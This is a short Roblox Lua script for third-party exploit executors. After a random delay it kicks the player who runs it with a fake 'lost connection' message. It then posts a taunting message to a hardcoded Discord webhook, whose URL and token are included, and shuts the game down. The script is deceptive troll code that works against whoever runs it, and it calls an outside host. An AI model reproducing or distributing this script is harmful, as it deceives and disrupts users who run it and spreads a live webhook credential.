   wait(math.random(300, 450) or math.random(600, 900))
    game.Players.LocalPlayer:Kick("lost connection to game server, please try reconnecting")
local webhookcheck =
    syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or identifyexecutor():find("ScriptWare") or "unsupported"
   
  
   

local url =
   "https://discord.com/api/webhooks/1000355102739152937/SC39amWbLYrhHR96LMUBpA-Z01Ke3fdMWNR-eOSC3hErxY0Af-FSAsNvud508eu8hVZt"
local data = {
   ["content"] = "<@706062672403234856> hai gay kicked! gg ez bois",
   }
   local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or syn.request or http.request or fluxus.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
wait(2)
game:Shutdown()
